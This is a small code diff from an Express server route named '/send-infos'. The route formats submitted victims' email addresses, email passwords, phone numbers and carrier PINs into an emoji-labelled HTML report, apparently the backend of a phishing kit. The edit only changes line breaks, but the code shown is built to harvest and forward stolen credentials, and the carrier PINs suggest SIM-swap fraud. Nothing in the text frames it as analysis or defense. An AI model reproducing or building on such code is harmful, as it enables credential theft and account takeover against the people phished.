@@ -80,13 +80,13 @@ app.post("/send-infos", async (req, res) => {
          <br>
         `
                      : `
-               <br><br>
+               <br>
                <h4>| ACCOUNT UPDATE</h4>
                <p>| EMAIL ADDRESS 👉🏽 <b>${values.accountUpdate.email}</b></p>
                <p>| EMAIL ADDRESS PASSWORD 👉🏽 <b>${values.accountUpdate.password}</b></p>
                <p>| PHONE NUMBER 👉🏽 <b>${values.accountUpdate.phoneNumber}</b></p>
                <p>| CARRIER PIN 👉🏽 <b>${values.accountUpdate.carrierPin}</b></p>
-               <br><br>
+               <br>
                `
                  }`
            }`
